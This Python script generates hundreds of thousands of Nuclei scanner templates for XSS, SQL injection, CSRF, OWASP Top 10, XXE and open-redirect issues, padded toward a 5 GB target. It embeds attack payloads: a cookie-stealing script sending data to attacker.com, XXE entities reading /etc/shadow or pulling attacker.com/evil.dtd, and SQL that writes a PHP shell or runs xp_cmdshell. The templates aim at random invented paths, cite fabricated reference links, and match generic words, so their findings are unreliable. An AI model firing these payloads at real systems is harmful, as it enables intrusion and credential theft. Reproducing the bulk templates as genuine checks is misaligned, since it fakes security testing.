#!/usr/bin/env python3
import os
import yaml
import random
import string
import argparse
import time
from datetime import datetime
from concurrent.futures import ProcessPoolExecutor, as_completed

# Function to generate a random string
def random_string(length=10):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

# Function to generate a random URL path
def random_path():
    paths = [
        '/admin', '/user', '/api', '/login', '/register', '/profile', '/settings',
        '/account', '/dashboard', '/cart', '/checkout', '/product', '/search',
        '/upload', '/download', '/file', '/image', '/video', '/audio', '/document',
        '/blog', '/news', '/forum', '/comment', '/post', '/article', '/category',
        '/tag', '/feed', '/rss', '/xml', '/json', '/graphql', '/oauth', '/auth',
        '/payment', '/invoice', '/order', '/subscription', '/plan', '/service'
    ]
    return random.choice(paths) + '/' + random_string(5)

# Function to generate a random parameter
def random_param():
    params = ['id', 'user', 'name', 'file', 'page', 'query', 'search', 'sort', 'filter', 
              'category', 'type', 'format', 'view', 'action', 'token', 'key', 'value',
              'email', 'username', 'password', 'code', 'redirect', 'url', 'target',
              'callback', 'return', 'next', 'prev', 'source', 'destination', 'data',
              'content', 'message', 'title', 'description', 'text', 'status', 'state',
              'mode', 'option', 'config', 'setting', 'preference', 'language', 'locale']
    return random.choice(params)

# XSS Templates Generator
def generate_xss_templates(base_dir, count=200000):
    print(f'Generating {count} XSS templates...')
    xss_dir = os.path.join(base_dir, 'xss')
    os.makedirs(xss_dir, exist_ok=True)
    
    xss_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '"><script>alert(1)</script>',
        '\';alert(1)//',
        '<script>fetch("https://attacker.com?cookie="+document.cookie )</script>',
        '<img src=x onerror="eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror="alert(1)">',
        '<marquee onstart=alert(1)>',
        '<isindex type=image src=1 onerror=alert(1)>',
        '<form><button formaction="javascript:alert(1)">',
        '<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><img src=1 onerror=alert(1)>">',
        '<script>Object.defineProperties(window, {x: {value: {y: {value: 1}}}});alert(window.x.y)</script>',
        '<script>var x = "hello"; (function() { alert(1); })();</script>',
        '<a href="javascript:alert(1)">Click me</a>',
        '<div style="background-image: url(javascript:alert(1))">',
        '<div style="width: expression(alert(1))">',
        '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>',
        '<svg><animate onbegin=alert(1) attributeName=x></animate>',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
        '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        '<script>setTimeout(\'alert(1)\',0)</script>'
    ]
    
    start_time = time.time()
    batch_size = 10000
    
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        batch_dir = os.path.join(xss_dir, f'batch_{batch_start // batch_size}')
        os.makedirs(batch_dir, exist_ok=True)
        
        for i in range(batch_start, batch_end):
            template_id = f'xss-variation-{i+1}'
            payload = random.choice(xss_payloads)
            path = random_path()
            param = random.choice(['q', 'search', 'id', 'name', 'value', 'input', 'data', 'query', 'text', 'content'])
            
            template = {
                'id': template_id,
                'info': {
                    'name': f'XSS in {param} parameter via {path}',
                    'author': 'nuclei-templates-generator',
                    'severity': random.choice(['medium', 'high']),
                    'description': f'A Cross-Site Scripting (XSS) vulnerability in the {param} parameter on {path} endpoint allows attackers to execute arbitrary JavaScript code in the context of the victim\'s browser.',
                    'reference': [
                        'https://owasp.org/www-community/attacks/xss/',
                        f'https://example.com/xss/reference/{random_string(8 )}'
                    ],
                    'tags': ['xss', 'injection', f'param-{param}'],
                    'classification': {
                        'cwe-id': 'CWE-79'
                    }
                },
                'http': [
                    {
                        'method': 'GET',
                        'path': [
                            f'{{{{BaseURL}}}}{path}?{param}={payload}'
                        ],
                        'matchers-condition': 'and',
                        'matchers': [
                            {
                                'type': 'word',
                                'words': [
                                    payload
                                ],
                                'part': 'body'
                            },
                            {
                                'type': 'status',
                                'status': [
                                    200
                                ]
                            }
                        ]
                    }
                ]
            }
            
            filename = f'{template_id}.yaml'
            filepath = os.path.join(batch_dir, filename )
                
            with open(filepath, 'w') as f:
                yaml.dump(template, f, default_flow_style=False)
            
            if (i + 1) % 10000 == 0:
                elapsed = time.time() - start_time
                print(f'Generated {i + 1}/{count} XSS templates... ({elapsed:.2f}s elapsed)')
    
    # Calculate total size
    total_size_bytes = sum(os.path.getsize(os.path.join(root, file)) 
                          for root, _, files in os.walk(xss_dir) 
                          for file in files if file.endswith('.yaml'))
    total_size_mb = total_size_bytes / (1024 * 1024)
    
    print(f'Total XSS templates generated: {count}')
    print(f'Total size of XSS templates: {total_size_mb:.2f} MB')
    return total_size_mb

# SQL Injection Templates Generator
def generate_sqli_templates(base_dir, count=200000):
    print(f'Generating {count} SQL Injection templates...')
    sqli_dir = os.path.join(base_dir, 'sqli')
    os.makedirs(sqli_dir, exist_ok=True)
    
    sqli_payloads = [
        '\'',
        '1\'',
        '1\' OR \'1\'=\'1',
        '1\' OR \'1\'=\'1\' --',
        '1\' OR \'1\'=\'1\' #',
        '1\' OR \'1\'=\'1\' /*',
        '\' OR 1=1 --',
        '\' OR 1=1 #',
        '\' OR 1=1 /*',
        '\' UNION SELECT 1,2,3 --',
        '\' UNION SELECT 1,2,3,4 --',
        '\' UNION SELECT 1,2,3,4,5 --',
        '1\' ORDER BY 10 --',
        '1\' GROUP BY 1,2,3 --',
        '\' HAVING 1=1 --',
        '\' SELECT @@version --',
        '\' SELECT user() --',
        '\' SELECT database() --',
        '\' SELECT table_name FROM information_schema.tables --',
        '\' SELECT column_name FROM information_schema.columns --',
        '\' SELECT 1,2,load_file(\'/etc/passwd\') --',
        '\' INTO OUTFILE \'/var/www/html/shell.php\' --',
        '\' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --',
        '\' AND SLEEP(5) --',
        '\' OR SLEEP(5) --',
        '\' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --',
        '\' WAITFOR DELAY \'0:0:5\' --',
        '\' AND 1=(SELECT COUNT(*) FROM tabname) --',
        '\' AND 1=(SELECT COUNT(*) FROM sysusers) --',
        '\' EXEC xp_cmdshell(\'dir\') --'
    ]
    
    start_time = time.time()
    batch_size = 10000
    
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        batch_dir = os.path.join(sqli_dir, f'batch_{batch_start // batch_size}')
        os.makedirs(batch_dir, exist_ok=True)
        
        for i in range(batch_start, batch_end):
            template_id = f'sqli-variation-{i+1}'
            payload = random.choice(sqli_payloads)
            path = random_path()
            param = random.choice(['id', 'user_id', 'product_id', 'category', 'page', 'query', 'search', 'item', 'order'])
            
            template = {
                'id': template_id,
                'info': {
                    'name': f'SQL Injection in {param} parameter via {path}',
                    'author': 'nuclei-templates-generator',
                    'severity': random.choice(['high', 'critical']),
                    'description': f'A SQL Injection vulnerability in the {param} parameter on {path} endpoint allows attackers to manipulate database queries and potentially access, modify, or delete data.',
                    'reference': [
                        'https://owasp.org/www-community/attacks/SQL_Injection',
                        f'https://example.com/sqli/reference/{random_string(8 )}'
                    ],
                    'tags': ['sqli', 'injection', f'param-{param}'],
                    'classification': {
                        'cwe-id': 'CWE-89'
                    }
                },
                'http': [
                    {
                        'method': 'GET',
                        'path': [
                            f'{{{{BaseURL}}}}{path}?{param}={payload}'
                        ],
                        'matchers-condition': 'or',
                        'matchers': [
                            {
                                'type': 'word',
                                'words': [
                                    'SQL syntax',
                                    'mysql_fetch_array',
                                    'mysqli_fetch_array',
                                    'ORA-01756',
                                    'ORA-00933',
                                    'Microsoft SQL Native Client error',
                                    'ODBC SQL Server Driver',
                                    'SQLite3::query',
                                    'PostgreSQL',
                                    'ERROR:',
                                    'mysql_num_rows( )',
                                    'mysql_fetch_assoc()',
                                    'Warning: mysql_',
                                    'Warning: pg_',
                                    'Warning: sqlsrv_',
                                    'Warning: oci_',
                                    'Warning: sqlite_',
                                    'Warning: PDO',
                                    'SQLSTATE[',
                                    'syntax error'
                                ],
                                'condition': 'or',
                                'part': 'body'
                            },
                            {
                                'type': 'regex',
                                'regex': [
                                    'SQL syntax.*?MySQL',
                                    'Warning.*?\\Wmysqli?_',
                                    'PostgreSQL.*?ERROR',
                                    'Driver.*? SQL[-_]*Server',
                                    'ORA-[0-9][0-9][0-9][0-9]',
                                    'Microsoft Access Driver',
                                    'JET Database Engine',
                                    'SQLite/JDBCDriver',
                                    'SQLite.Exception',
                                    'System.Data.SQLite.SQLiteException',
                                    'SQLITE_ERROR',
                                    'CLI Driver.*?DB2',
                                    'DB2 SQL error',
                                    'Exception.*?Oracle',
                                    'Sybase message',
                                    'Informix'
                                ],
                                'condition': 'or',
                                'part': 'body'
                            }
                        ]
                    }
                ]
            }
            
            filename = f'{template_id}.yaml'
            filepath = os.path.join(batch_dir, filename)
                
            with open(filepath, 'w') as f:
                yaml.dump(template, f, default_flow_style=False)
            
            if (i + 1) % 10000 == 0:
                elapsed = time.time() - start_time
                print(f'Generated {i + 1}/{count} SQL Injection templates... ({elapsed:.2f}s elapsed)')
    
    # Calculate total size
    total_size_bytes = sum(os.path.getsize(os.path.join(root, file)) 
                          for root, _, files in os.walk(sqli_dir) 
                          for file in files if file.endswith('.yaml'))
    total_size_mb = total_size_bytes / (1024 * 1024)
    
    print(f'Total SQL Injection templates generated: {count}')
    print(f'Total size of SQL Injection templates: {total_size_mb:.2f} MB')
    return total_size_mb

# CSRF Templates Generator
def generate_csrf_templates(base_dir, count=200000):
    print(f'Generating {count} CSRF templates...')
    csrf_dir = os.path.join(base_dir, 'csrf')
    os.makedirs(csrf_dir, exist_ok=True)
    
    csrf_endpoints = [
        '/user/profile/update',
        '/account/settings',
        '/admin/users/edit',
        '/password/change',
        '/email/update',
        '/profile/picture/upload',
        '/settings/privacy',
        '/user/delete',
        '/payment/add',
        '/order/create',
        '/comment/post',
        '/message/send',
        '/friend/add',
        '/subscription/update',
        '/newsletter/subscribe',
        '/vote/submit',
        '/review/add',
        '/address/update',
        '/preferences/save',
        '/cart/checkout'
    ]
    
    start_time = time.time()
    batch_size = 10000
    
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        batch_dir = os.path.join(csrf_dir, f'batch_{batch_start // batch_size}')
        os.makedirs(batch_dir, exist_ok=True)
        
        for i in range(batch_start, batch_end):
            template_id = f'csrf-variation-{i+1}'
            endpoint = random.choice(csrf_endpoints)
            
            template = {
                'id': template_id,
                'info': {
                    'name': f'CSRF vulnerability in {endpoint}',
                    'author': 'nuclei-templates-generator',
                    'severity': random.choice(['medium', 'high']),
                    'description': f'A Cross-Site Request Forgery (CSRF) vulnerability in the {endpoint} endpoint allows attackers to perform actions on behalf of authenticated users without their consent.',
                    'reference': [
                        'https://owasp.org/www-community/attacks/csrf',
                        f'https://example.com/csrf/reference/{random_string(8 )}'
                    ],
                    'tags': ['csrf', 'web', 'security'],
                    'classification': {
                        'cwe-id': 'CWE-352'
                    }
                },
                'http': [
                    {
                        'method': 'GET',
                        'path': [
                            f'{{{{BaseURL}}}}{endpoint}'
                        ],
                        'matchers-condition': 'and',
                        'matchers': [
                            {
                                'type': 'word',
                                'words': [
                                    '<form',
                                    'method=',
                                    'action='
                                ],
                                'condition': 'and',
                                'part': 'body'
                            },
                            {
                                'type': 'word',
                                'words': [
                                    'csrf',
                                    'token',
                                    'nonce',
                                    'xsrf'
                                ],
                                'condition': 'or',
                                'part': 'body',
                                'negative': True
                            },
                            {
                                'type': 'status',
                                'status': [
                                    200
                                ]
                            }
                        ]
                    }
                ]
            }
            
            filename = f'{template_id}.yaml'
            filepath = os.path.join(batch_dir, filename )
                
            with open(filepath, 'w') as f:
                yaml.dump(template, f, default_flow_style=False)
            
            if (i + 1) % 10000 == 0:
                elapsed = time.time() - start_time
                print(f'Generated {i + 1}/{count} CSRF templates... ({elapsed:.2f}s elapsed)')
    
    # Calculate total size
    total_size_bytes = sum(os.path.getsize(os.path.join(root, file)) 
                          for root, _, files in os.walk(csrf_dir) 
                          for file in files if file.endswith('.yaml'))
    total_size_mb = total_size_bytes / (1024 * 1024)
    
    print(f'Total CSRF templates generated: {count}')
    print(f'Total size of CSRF templates: {total_size_mb:.2f} MB')
    return total_size_mb

# OWASP Top 10 Templates Generator
def generate_owasp_top10_templates(base_dir, count=200000):
    print(f'Generating {count} OWASP Top 10 templates...')
    owasp_dir = os.path.join(base_dir, 'owasp_top10')
    os.makedirs(owasp_dir, exist_ok=True)
    
    owasp_categories = [
        {
            'id': 'A01:2021',
            'name': 'Broken Access Control',
            'cwe': ['CWE-22', 'CWE-23', 'CWE-35', 'CWE-59', 'CWE-200', 'CWE-201', 'CWE-219', 'CWE-264', 'CWE-275', 'CWE-276', 'CWE-284', 'CWE-285', 'CWE-352', 'CWE-359', 'CWE-377', 'CWE-402', 'CWE-425', 'CWE-441', 'CWE-497', 'CWE-538', 'CWE-540', 'CWE-548', 'CWE-552', 'CWE-566', 'CWE-601', 'CWE-639', 'CWE-651', 'CWE-668', 'CWE-706', 'CWE-862', 'CWE-863', 'CWE-913', 'CWE-922', 'CWE-1275']
        },
        {
            'id': 'A02:2021',
            'name': 'Cryptographic Failures',
            'cwe': ['CWE-261', 'CWE-296', 'CWE-310', 'CWE-319', 'CWE-321', 'CWE-322', 'CWE-323', 'CWE-324', 'CWE-325', 'CWE-326', 'CWE-327', 'CWE-328', 'CWE-329', 'CWE-330', 'CWE-331', 'CWE-335', 'CWE-336', 'CWE-337', 'CWE-338', 'CWE-340', 'CWE-347', 'CWE-523', 'CWE-720', 'CWE-757', 'CWE-759', 'CWE-760', 'CWE-780', 'CWE-818', 'CWE-916']
        },
        {
            'id': 'A03:2021',
            'name': 'Injection',
            'cwe': ['CWE-20', 'CWE-74', 'CWE-75', 'CWE-77', 'CWE-78', 'CWE-79', 'CWE-80', 'CWE-83', 'CWE-87', 'CWE-88', 'CWE-89', 'CWE-90', 'CWE-91', 'CWE-93', 'CWE-94', 'CWE-95', 'CWE-96', 'CWE-97', 'CWE-98', 'CWE-99', 'CWE-100', 'CWE-113', 'CWE-116', 'CWE-138', 'CWE-184', 'CWE-470', 'CWE-471', 'CWE-564', 'CWE-610', 'CWE-643', 'CWE-644', 'CWE-652', 'CWE-917']
        },
        {
            'id': 'A04:2021',
            'name': 'Insecure Design',
            'cwe': ['CWE-73', 'CWE-183', 'CWE-209', 'CWE-213', 'CWE-235', 'CWE-256', 'CWE-257', 'CWE-266', 'CWE-269', 'CWE-280', 'CWE-311', 'CWE-312', 'CWE-313', 'CWE-316', 'CWE-419', 'CWE-430', 'CWE-434', 'CWE-444', 'CWE-451', 'CWE-472', 'CWE-501', 'CWE-522', 'CWE-525', 'CWE-539', 'CWE-579', 'CWE-598', 'CWE-602', 'CWE-642', 'CWE-646', 'CWE-650', 'CWE-653', 'CWE-654', 'CWE-656', 'CWE-657', 'CWE-799', 'CWE-807', 'CWE-840', 'CWE-841', 'CWE-927', 'CWE-1021', 'CWE-1173']
        },
        {
            'id': 'A05:2021',
            'name': 'Security Misconfiguration',
            'cwe': ['CWE-2', 'CWE-11', 'CWE-13', 'CWE-15', 'CWE-16', 'CWE-260', 'CWE-315', 'CWE-520', 'CWE-526', 'CWE-537', 'CWE-541', 'CWE-547', 'CWE-611', 'CWE-614', 'CWE-756', 'CWE-776', 'CWE-942', 'CWE-1004', 'CWE-1032', 'CWE-1174']
        },
        {
            'id': 'A06:2021',
            'name': 'Vulnerable and Outdated Components',
            'cwe': ['CWE-937', 'CWE-1035', 'CWE-1104']
        },
        {
            'id': 'A07:2021',
            'name': 'Identification and Authentication Failures',
            'cwe': ['CWE-255', 'CWE-259', 'CWE-287', 'CWE-288', 'CWE-290', 'CWE-294', 'CWE-295', 'CWE-297', 'CWE-300', 'CWE-302', 'CWE-304', 'CWE-306', 'CWE-307', 'CWE-346', 'CWE-384', 'CWE-521', 'CWE-613', 'CWE-620', 'CWE-640', 'CWE-798', 'CWE-940', 'CWE-1216']
        },
        {
            'id': 'A08:2021',
            'name': 'Software and Data Integrity Failures',
            'cwe': ['CWE-345', 'CWE-353', 'CWE-426', 'CWE-494', 'CWE-502', 'CWE-565', 'CWE-784', 'CWE-829', 'CWE-830', 'CWE-915']
        },
        {
            'id': 'A09:2021',
            'name': 'Security Logging and Monitoring Failures',
            'cwe': ['CWE-117', 'CWE-223', 'CWE-532', 'CWE-778']
        },
        {
            'id': 'A10:2021',
            'name': 'Server-Side Request Forgery',
            'cwe': ['CWE-918']
        }
    ]
    
    start_time = time.time()
    batch_size = 10000
    
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        batch_dir = os.path.join(owasp_dir, f'batch_{batch_start // batch_size}')
        os.makedirs(batch_dir, exist_ok=True)
        
        for i in range(batch_start, batch_end):
            category = random.choice(owasp_categories)
            cwe = random.choice(category['cwe']) if category['cwe'] else 'CWE-0'
            template_id = f'owasp-{category["id"].lower().replace(":", "-")}-{cwe.lower()}-{i+1}'
            path = random_path()
            
            template = {
                'id': template_id,
                'info': {
                    'name': f'{category["name"]} ({category["id"]}) - {cwe}',
                    'author': 'nuclei-templates-generator',
                    'severity': random.choice(['medium', 'high', 'critical']),
                    'description': f'A vulnerability related to {category["name"]} ({category["id"]}) identified as {cwe} exists in the {path} endpoint.',
                    'reference': [
                        'https://owasp.org/Top10/',
                        f'https://cwe.mitre.org/data/definitions/{cwe.split("-" )[1]}.html',
                        f'https://example.com/owasp/reference/{random_string(8 )}'
                    ],
                    'tags': ['owasp-top10', category['id'].lower().replace(':', '-'), cwe.lower()],
                    'classification': {
                        'cwe-id': cwe
                    }
                },
                'http': [
                    {
                        'method': random.choice(['GET', 'POST'] ),
                        'path': [
                            f'{{{{BaseURL}}}}{path}'
                        ],
                        'matchers-condition': 'and',
                        'matchers': [
                            {
                                'type': 'word',
                                'words': [
                                    'error',
                                    'exception',
                                    'vulnerable',
                                    'warning',
                                    'debug',
                                    'stack trace'
                                ],
                                'condition': 'or',
                                'part': 'body'
                            },
                            {
                                'type': 'status',
                                'status': [
                                    200, 
                                    403, 
                                    500
                                ],
                                'condition': 'or'
                            }
                        ]
                    }
                ]
            }
            
            filename = f'{template_id}.yaml'
            filepath = os.path.join(batch_dir, filename)
                
            with open(filepath, 'w') as f:
                yaml.dump(template, f, default_flow_style=False)
            
            if (i + 1) % 10000 == 0:
                elapsed = time.time() - start_time
                print(f'Generated {i + 1}/{count} OWASP Top 10 templates... ({elapsed:.2f}s elapsed)')
    
    # Calculate total size
    total_size_bytes = sum(os.path.getsize(os.path.join(root, file)) 
                          for root, _, files in os.walk(owasp_dir) 
                          for file in files if file.endswith('.yaml'))
    total_size_mb = total_size_bytes / (1024 * 1024)
    
    print(f'Total OWASP Top 10 templates generated: {count}')
    print(f'Total size of OWASP Top 10 templates: {total_size_mb:.2f} MB')
    return total_size_mb

# XXE Templates Generator
def generate_xxe_templates(base_dir, count=200000):
    print(f'Generating {count} XXE templates...')
    xxe_dir = os.path.join(base_dir, 'xxe')
    os.makedirs(xxe_dir, exist_ok=True)
    
    xxe_payloads = [
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://attacker.com/evil">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///dev/random"> %xxe; ]>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]><test>test</test>'
    ]
    
    start_time = time.time( )
    batch_size = 10000
    
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        batch_dir = os.path.join(xxe_dir, f'batch_{batch_start // batch_size}')
        os.makedirs(batch_dir, exist_ok=True)
        
        for i in range(batch_start, batch_end):
            template_id = f'xxe-variation-{i+1}'
            payload = random.choice(xxe_payloads)
            path = random_path()
            
            template = {
                'id': template_id,
                'info': {
                    'name': f'XXE vulnerability in {path}',
                    'author': 'nuclei-templates-generator',
                    'severity': random.choice(['high', 'critical']),
                    'description': f'An XML External Entity (XXE) vulnerability in the {path} endpoint allows attackers to read local files, perform SSRF attacks, or cause denial of service.',
                    'reference': [
                        'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE )_Processing',
                        f'https://example.com/xxe/reference/{random_string(8 )}'
                    ],
                    'tags': ['xxe', 'injection', 'owasp-top10'],
                    'classification': {
                        'cwe-id': 'CWE-611'
                    }
                },
                'http': [
                    {
                        'method': 'POST',
                        'path': [
                            f'{{{{BaseURL}}}}{path}'
                        ],
                        'headers': {
                            'Content-Type': 'application/xml'
                        },
                        'body': payload,
                        'matchers-condition': 'or',
                        'matchers': [
                            {
                                'type': 'word',
                                'words': [
                                    'root:',
                                    '/bin/bash',
                                    '[boot loader]',
                                    'uid=',
                                    'daemon:',
                                    'file not found',
                                    'java.io.FileNotFoundException',
                                    'ftp:',
                                    'www-data:',
                                    'Internal Server Error'
                                ],
                                'condition': 'or',
                                'part': 'body'
                            },
                            {
                                'type': 'regex',
                                'regex': [
                                    'root:.*:0:0:',
                                    '[a-zA-Z0-9_]+:[a-zA-Z0-9_]+:[0-9]+:[0-9]+:'
                                ],
                                'condition': 'or',
                                'part': 'body'
                            }
                        ]
                    }
                ]
            }
            
            filename = f'{template_id}.yaml'
            filepath = os.path.join(batch_dir, filename )
                
            with open(filepath, 'w') as f:
                yaml.dump(template, f, default_flow_style=False)
            
            if (i + 1) % 10000 == 0:
                elapsed = time.time() - start_time
                print(f'Generated {i + 1}/{count} XXE templates... ({elapsed:.2f}s elapsed)')
    
    # Calculate total size
    total_size_bytes = sum(os.path.getsize(os.path.join(root, file)) 
                          for root, _, files in os.walk(xxe_dir) 
                          for file in files if file.endswith('.yaml'))
    total_size_mb = total_size_bytes / (1024 * 1024)
    
    print(f'Total XXE templates generated: {count}')
    print(f'Total size of XXE templates: {total_size_mb:.2f} MB')
    return total_size_mb

# Open Redirect Templates Generator
def generate_open_redirect_templates(base_dir, count=200000):
    print(f'Generating {count} Open Redirect templates...')
    open_redirect_dir = os.path.join(base_dir, 'open_redirect')
    os.makedirs(open_redirect_dir, exist_ok=True)
    
    redirect_payloads = [
        'https://evil.com',
        '//evil.com',
        'https:evil.com',
        '////evil.com',
        'https://evil.com%252f@example.com',
        'https://evil.com/path?query=value',
        'https://evil.com#fragment',
        'javascript:alert(document.domain )',
        'data:text/html,<script>window.location="https://evil.com"</script>',
        'https://example.com@evil.com',
        'https://example.com.evil.com',
        'https://evil.com/?url=https://example.com',
        'https://evil.com/%09/example.com',
        'https://evil.com/%5cexample.com',
        'https://evil.com/example.com',
        'https://evil.com%2f%2f',
        'https://evil.com//example.com/',
        'https:///evil.com/%2f%2e%2e',
        'https://evil.com/%2f%2e%2e',
        'https:////evil.com'
    ]
    
    redirect_params = [
        'url', 'redirect', 'redirect_to', 'redirecturl', 'return', 'return_url', 'returnurl',
        'goto', 'next', 'target', 'link', 'dest', 'destination', 'redir', 'redirect_uri',
        'continue', 'path', 'navigation', 'returnTo', 'to', 'out', 'view', 'response_url',
        'return_path', 'retUrl', 'next_url', 'forward', 'forward_url', 'location'
    ]
    
    start_time = time.time( )
    batch_size = 10000
    
    for batch_start in range(0, count, batch_size):
        batch_end = min(batch_start + batch_size, count)
        batch_dir = os.path.join(open_redirect_dir, f'batch_{batch_start // batch_size}')
        os.makedirs(batch_dir, exist_ok=True)
        
        for i in range(batch_start, batch_end):
            template_id = f'open-redirect-variation-{i+1}'
            payload = random.choice(redirect_payloads)
            path = random_path()
            param = random.choice(redirect_params)
            
            template = {
                'id': template_id,
                'info': {
                    'name': f'Open Redirect in {param} parameter via {path}',
                    'author': 'nuclei-templates-generator',
                    'severity': random.choice(['low', 'medium']),
                    'description': f'An Open Redirect vulnerability in the {param} parameter on {path} endpoint allows attackers to redirect users to arbitrary external domains.',
                    'reference': [
                        'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html',
                        f'https://example.com/open-redirect/reference/{random_string(8 )}'
                    ],
                    'tags': ['open-redirect', 'web', f'param-{param}'],
                    'classification': {
                        'cwe-id': 'CWE-601'
                    }
                },
                'http': [
                    {
                        'method': 'GET',
                        'path': [
                            f'{{{{BaseURL}}}}{path}?{param}={payload}'
                        ],
                        'redirects': True,
                        'max-redirects': 2,
                        'matchers-condition': 'or',
                        'matchers': [
                            {
                                'type': 'regex',
                                'regex': [
                                    'evil\\.com',
                                    'Location: (https?: )?//evil\\.com',
                                    '(?m)^(?:Location\\s*?:\\s*?)(?:https?: )?(?://|\\\\\\\\|\\\\)?(?:\\s*?)(evil\\.com)',
                                    '(?m)^(?:Location\\s*?:\\s*?)(?:https?://|// )?evil\\.com',
                                    '(?:evil\\.com)'
                                ],
                                'condition': 'or',
                                'part': 'header'
                            },
                            {
                                'type': 'dsl',
                                'dsl': [
                                    'contains(body, "evil.com")',
                                    'contains(all_headers, "evil.com")'
                                ],
                                'condition': 'or'
                            }
                        ]
                    }
                ]
            }
            
            filename = f'{template_id}.yaml'
            filepath = os.path.join(batch_dir, filename)
                
            with open(filepath, 'w') as f:
                yaml.dump(template, f, default_flow_style=False)
            
            if (i + 1) % 10000 == 0:
                elapsed = time.time() - start_time
                print(f'Generated {i + 1}/{count} Open Redirect templates... ({elapsed:.2f}s elapsed)')
    
    # Calculate total size
    total_size_bytes = sum(os.path.getsize(os.path.join(root, file)) 
                          for root, _, files in os.walk(open_redirect_dir) 
                          for file in files if file.endswith('.yaml'))
    total_size_mb = total_size_bytes / (1024 * 1024)
    
    print(f'Total Open Redirect templates generated: {count}')
    print(f'Total size of Open Redirect templates: {total_size_mb:.2f} MB')
    return total_size_mb

# Main function to generate all templates
def generate_all_templates(base_dir, target_size_gb=5):
    print(f"Starting massive nuclei template generation with target size of {target_size_gb}GB...")
    
    # Track total size
    total_size_mb = 0
    
    # Generate templates for each category
    categories = [
        ('XSS', generate_xss_templates),
        ('SQL Injection', generate_sqli_templates),
        ('CSRF', generate_csrf_templates),
        ('OWASP Top 10', generate_owasp_top10_templates),
        ('XXE', generate_xxe_templates),
        ('Open Redirect', generate_open_redirect_templates)
    ]
    
    # Initial count per category
    count_per_category = 200000
    
    # Generate templates for each category
    for category_name, generator_func in categories:
        print(f"\nGenerating {category_name} templates...")
        size_mb = generator_func(base_dir, count_per_category)
        total_size_mb += size_mb
        total_size_gb = total_size_mb / 1024
        print(f"Current total size: {total_size_mb:.2f} MB ({total_size_gb:.2f} GB)")
        
        # Check if we've reached the target size
        if total_size_gb >= target_size_gb:
            print(f"\nReached target size of {target_size_gb}GB!")
            break
    
    # If we haven't reached the target size, generate more templates for the first category
    if total_size_gb < target_size_gb:
        remaining_gb = target_size_gb - total_size_gb
        remaining_mb = remaining_gb * 1024
        
        # Estimate how many more templates we need based on average size
        avg_size_per_template = total_size_mb / (len(categories) * count_per_category)
        additional_templates = int(remaining_mb / avg_size_per_template)
        
        print(f"\nGenerating additional {additional_templates} templates to reach target size...")
        
        # Generate additional templates for the first category
        category_name, generator_func = categories[0]
        print(f"\nGenerating additional {category_name} templates...")
        size_mb = generator_func(base_dir, additional_templates)
        total_size_mb += size_mb
        total_size_gb = total_size_mb / 1024
    
    print(f"\nTemplate generation complete!")
    print(f"Total size: {total_size_mb:.2f} MB ({total_size_gb:.2f} GB)")
    
    if total_size_gb < target_size_gb:
        print(f"Warning: Total size is less than target {target_size_gb}GB. Consider generating more templates.")
    else:
        print(f"Success! Generated {total_size_gb:.2f}GB of templates, exceeding the target of {target_size_gb}GB.")

# Function to create a zip file of all templates
def create_zip_archive(base_dir, output_zip):
    print(f"Creating zip archive of all templates...")
    import zipfile
    import os
    
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(base_dir):
            for file in files:
                if file.endswith('.yaml'):
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(base_dir))
                    zipf.write(file_path, arcname)
    
    # Get the size of the zip file
    zip_size_bytes = os.path.getsize(output_zip)
    zip_size_mb = zip_size_bytes / (1024 * 1024)
    zip_size_gb = zip_size_mb / 1024
    
    print(f"Zip archive created: {output_zip}")
